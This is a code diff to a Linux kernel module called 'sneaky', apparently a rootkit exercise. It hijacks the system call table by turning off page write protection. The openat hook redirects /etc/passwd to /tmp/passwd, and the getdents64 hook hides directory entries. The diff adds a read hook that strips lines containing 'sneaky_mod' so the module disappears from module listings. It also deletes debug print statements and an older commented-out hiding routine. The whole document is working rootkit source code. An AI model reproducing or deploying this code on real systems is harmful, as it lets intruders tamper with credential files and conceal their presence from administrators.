@@ -53,11 +53,10 @@ int disable_page_rw(void *ptr) {
 //    should expect it find its arguments on the stack (not in registers).
 asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int (*original_getdents64)(struct pt_regs *);
-
+asmlinkage ssize_t (*original_read)(struct pt_regs *);
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
     // Implement the sneaky part here
-//printk(KERN_INFO "[Sneaky_sys_open]\n");
     char *file_path = (char *) regs->si;
     char tem_file_path[20] = "/tmp/passwd";
     if (strcmp(file_path, "/etc/passwd") == 0) {
@@ -67,7 +66,6 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 }
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
-    printk(KERN_INFO "[Sneaky_sys_getdents64]\n");
     struct linux_dirent64 *td,*td1,*td2,*td3;
     struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
     int number;
@@ -105,46 +103,24 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
     return (copy_len);
 }
 
-//asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
-//    printk(KERN_INFO "[Sneaky_sys_getdents64]\n");
-//    struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
-//    int buf_len, record_len, modify_buf_len;
-//    struct linux_dirent64 *dirp2, *dirp3, *head = NULL, *prev = NULL;
-//    char hide_sneaky[] = "sneaky_process";
-//    buf_len = original_getdents64(regs);
-//    if (buf_len <= 0) return buf_len;
-//    dirp2 = (struct linux_dirent64 *) kmalloc(buf_len, GFP_KERNEL);
-//    if (dirp2) return buf_len;
-//    if (copy_from_user(dirp2, dirp, buf_len)) {
-//        printk("fail to copy dirp tp dirp2 \n");
-//        return buf_len;
-//    }
-//    head = dirp2;
-//    prev = dirp3;
-//    modify_buf_len = buf_len;
-//    while (((int) dirp3) < (((int) dirp2) + buf_len)) {
-//        record_len = dirp3->d_reclen;
-//        if (record_len == 0)
-//            break;
-//        if (strncmp(dirp3->d_name, hide_sneaky, strlen(hide_sneaky)) == 0 ||
-//            strncmp(dirp3->d_name, pid, strlen(pid)) == 0) {
-//            printk("Found the sneaky_process \n");
-//            if (!prev) {
-//                head = (struct linux_dirent64 *) ((char *) dirp3 + record_len);
-//                modify_buf_len -= record_len;
-//            } else {
-//                prev->d_reclen += record_len;
-//                memset(dirp3, 0, record_len);
-//            }
-//        } else {
-//            prev = dirp3;
-//        }
-//        dirp3 = (struct linux_dirent64 *) ((char *) dirp3 + record_len);
-//    }
-//    copy_to_user(dirp, head, modify_buf_len);
-//    kfree(dirp2);
-//    return modify_buf_len;
-//}
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+    ssize_t number = original_read(regs);
+    void *buf = (void *)regs->si;
+    if(!number || number<0)
+        return number;
+    void *head = strnstr(buf, "sneaky_mod", number);
+    if (head) {
+        int len = number - (head - buf);
+        void *tail = strnstr(head, "\n", len);
+        if (tail) {
+                tail++;
+                int tail_head = tail-head;
+                memmove(head, tail, len - tail_head);
+                number -= tail_head;
+        }
+    }
+    return number;
+}
 
 
 // The code that gets executed when the module is loaded
@@ -162,12 +138,13 @@ static int initialize_sneaky_module(void) {
     // table with the function address of our new code.
     original_openat = (void *) sys_call_table[__NR_openat];
     original_getdents64 = (void *) sys_call_table[__NR_getdents64];
-
+    original_read = (void *) sys_call_table[__NR_read];
     // Turn off write protection mode for sys_call_table
     enable_page_rw((void *) sys_call_table);
 
     sys_call_table[__NR_openat] = (unsigned long) sneaky_sys_openat;
     sys_call_table[__NR_getdents64] = (unsigned long) sneaky_sys_getdents64;
+    sys_call_table[__NR_read] = (unsigned long) sneaky_sys_read;
 
     // Turn write protection mode back on for sys_call_table
     disable_page_rw((void *) sys_call_table);
@@ -187,7 +164,7 @@ static void exit_sneaky_module(void) {
     // function address. Will look like malicious code was never there!
     sys_call_table[__NR_openat] = (unsigned long) original_openat;
     sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;
-
+    sys_call_table[__NR_read] = (unsigned long) original_read;
     // Turn write protection mode back on for sys_call_table
     disable_page_rw((void *) sys_call_table);
 }
